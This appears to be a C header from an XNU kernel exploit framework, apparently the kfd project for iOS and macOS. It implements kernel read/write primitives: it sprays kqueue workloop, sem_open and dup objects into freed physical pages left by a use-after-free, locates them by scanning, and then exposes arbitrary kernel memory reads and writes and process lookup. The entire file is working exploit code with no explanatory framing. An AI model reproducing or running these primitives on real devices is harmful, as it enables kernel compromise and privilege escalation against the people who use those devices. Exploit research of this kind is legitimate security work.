/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef krkw_h
#define krkw_h

#define kread_from_method(type, method)                                             \
    do {                                                                            \
        volatile type* type_base = (volatile type*)(uaddr);                         \
        u64 type_size = ((size) / (sizeof(type)));                                  \
        for (u64 type_offset = 0; type_offset < type_size; type_offset++) {         \
            type type_value = method(kfd, kaddr + (type_offset * sizeof(type)));    \
            type_base[type_offset] = type_value;                                    \
        }                                                                           \
    } while (0)

#include "krkw/kread/kread_kqueue_workloop_ctl.h"
#include "krkw/kread/kread_sem_open.h"

#define kwrite_from_method(type, method)                                       \
    do {                                                                       \
        volatile type* type_base = (volatile type*)(uaddr);                    \
        u64 type_size = ((size) / (sizeof(type)));                             \
        for (u64 type_offset = 0; type_offset < type_size; type_offset++) {    \
            type type_value = type_base[type_offset];                          \
            method(kfd, kaddr + (type_offset * sizeof(type)), type_value);     \
        }                                                                      \
    } while (0)

#include "krkw/kwrite/kwrite_dup.h"
#include "krkw/kwrite/kwrite_sem_open.h"

// Forward declarations for helper functions.
void krkw_helper_init(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_grab_free_pages(struct kfd* kfd);
void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw);
void krkw_helper_free(struct kfd* kfd, struct krkw* krkw);

#define kread_method_case(method)                                       \
    case method: {                                                      \
        const char* method_name = #method;                              \
        print_string(method_name);                                      \
        kfd->kread.krkw_method_ops.init = method##_init;                \
        kfd->kread.krkw_method_ops.allocate = method##_allocate;        \
        kfd->kread.krkw_method_ops.search = method##_search;            \
        kfd->kread.krkw_method_ops.kread = method##_kread;              \
        kfd->kread.krkw_method_ops.kwrite = NULL;                       \
        kfd->kread.krkw_method_ops.find_proc = method##_find_proc;      \
        kfd->kread.krkw_method_ops.deallocate = method##_deallocate;    \
        kfd->kread.krkw_method_ops.free = method##_free;                \
        break;                                                          \
    }

#define kwrite_method_case(method)                                       \
    case method: {                                                       \
        const char* method_name = #method;                               \
        print_string(method_name);                                       \
        kfd->kwrite.krkw_method_ops.init = method##_init;                \
        kfd->kwrite.krkw_method_ops.allocate = method##_allocate;        \
        kfd->kwrite.krkw_method_ops.search = method##_search;            \
        kfd->kwrite.krkw_method_ops.kread = NULL;                        \
        kfd->kwrite.krkw_method_ops.kwrite = method##_kwrite;            \
        kfd->kwrite.krkw_method_ops.find_proc = method##_find_proc;      \
        kfd->kwrite.krkw_method_ops.deallocate = method##_deallocate;    \
        kfd->kwrite.krkw_method_ops.free = method##_free;                \
        break;                                                           \
    }

void krkw_init(struct kfd* kfd, u64 kread_method, u64 kwrite_method)
{
    switch (kread_method) {
        kread_method_case(kread_kqueue_workloop_ctl)
        kread_method_case(kread_sem_open)
    }

    switch (kwrite_method) {
        kwrite_method_case(kwrite_dup)
        kwrite_method_case(kwrite_sem_open)
    }

    krkw_helper_init(kfd, &kfd->kread);
    krkw_helper_init(kfd, &kfd->kwrite);
}

void krkw_run(struct kfd* kfd)
{
    krkw_helper_grab_free_pages(kfd);

    timer_start();
    krkw_helper_run_allocate(kfd, &kfd->kread);
    krkw_helper_run_allocate(kfd, &kfd->kwrite);
    krkw_helper_run_deallocate(kfd, &kfd->kread);
    krkw_helper_run_deallocate(kfd, &kfd->kwrite);
    timer_end();
}

void krkw_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kfd->kread.krkw_method_ops.kread(kfd, kaddr, uaddr, size);
}

void krkw_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    kfd->kwrite.krkw_method_ops.kwrite(kfd, uaddr, kaddr, size);
}

void krkw_free(struct kfd* kfd)
{
    krkw_helper_free(kfd, &kfd->kread);
    krkw_helper_free(kfd, &kfd->kwrite);
}

/*
 * Helper krkw functions.
 */

void krkw_helper_init(struct kfd* kfd, struct krkw* krkw)
{
    krkw->krkw_method_ops.init(kfd);
}

void krkw_helper_grab_free_pages(struct kfd* kfd)
{
    timer_start();

    const u64 copy_pages = (kfd->info.copy.size / pages(1));
    const u64 grabbed_puaf_pages_goal = (kfd->puaf.number_of_puaf_pages / 4);
    const u64 grabbed_free_pages_max = 400000;

    for (u64 grabbed_free_pages = copy_pages; grabbed_free_pages < grabbed_free_pages_max; grabbed_free_pages += copy_pages) {
        assert_mach(vm_copy(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size, kfd->info.copy.dst_uaddr));

        u64 grabbed_puaf_pages = 0;
        for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
            u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
            if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
                if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                    print_u64(grabbed_free_pages);
                    timer_end();
                    return;
                }
            }
        }
    }

    print_warning("failed to grab free pages goal");
}

void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw)
{
    timer_start();
    const u64 batch_size = (pages(1) / krkw->krkw_object_size);

    while (true) {
        /*
         * Spray a batch of objects, but stop if the maximum id has been reached.
         */
        bool maximum_reached = false;

        for (u64 i = 0; i < batch_size; i++) {
            if (krkw->krkw_allocated_id == krkw->krkw_maximum_id) {
                maximum_reached = true;
                break;
            }

            krkw->krkw_method_ops.allocate(kfd, krkw->krkw_allocated_id);
            krkw->krkw_allocated_id++;
        }

        /*
         * Search the puaf pages for the last batch of objects.
         *
         * Note that we make the following assumptions:
         * - All objects have a 64-bit alignment.
         * - All objects can be found within 1/16th of a page.
         * - All objects have a size smaller than 15/16th of a page.
         */
        for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
            u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
            u64 stop_uaddr = puaf_page_uaddr + (pages(1) / 16);
            for (u64 object_uaddr = puaf_page_uaddr; object_uaddr < stop_uaddr; object_uaddr += sizeof(u64)) {
                if (krkw->krkw_method_ops.search(kfd, object_uaddr)) {
                    krkw->krkw_searched_id = krkw->krkw_object_id;
                    krkw->krkw_object_uaddr = object_uaddr;
                    goto loop_break;
                }
            }
        }

        krkw->krkw_searched_id = krkw->krkw_allocated_id;

        if (maximum_reached) {
loop_break:
            break;
        }
    }

    timer_end();
    const char* krkw_type = (krkw->krkw_method_ops.kread) ? "kread" : "kwrite";

    if (!krkw->krkw_object_uaddr) {
        for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
            u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
            print_buffer(puaf_page_uaddr, 64);
            break;
        }

        assert_false(krkw_type);
    }

    print_message(
        "%s ---> object_id = %llu, object_uaddr = 0x%016llx, object_size = %llu, allocated_id = %llu/%llu, batch_size = %llu",
        krkw_type,
        krkw->krkw_object_id,
        krkw->krkw_object_uaddr,
        krkw->krkw_object_size,
        krkw->krkw_allocated_id,
        krkw->krkw_maximum_id,
        batch_size
    );

    print_buffer(krkw->krkw_object_uaddr, krkw->krkw_object_size);

    if (!kfd->info.kaddr.current_proc) {
        krkw->krkw_method_ops.find_proc(kfd);
    }
}

void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw)
{
    timer_start();

    for (u64 id = 0; id < krkw->krkw_allocated_id; id++) {
        if (id == krkw->krkw_object_id) {
            continue;
        }

        krkw->krkw_method_ops.deallocate(kfd, id);
    }

    timer_end();
}

void krkw_helper_free(struct kfd* kfd, struct krkw* krkw)
{
    krkw->krkw_method_ops.free(kfd);

    if (krkw->krkw_method_data) {
        bzero_free(krkw->krkw_method_data, krkw->krkw_method_data_size);
    }
}

#endif /* krkw_h */
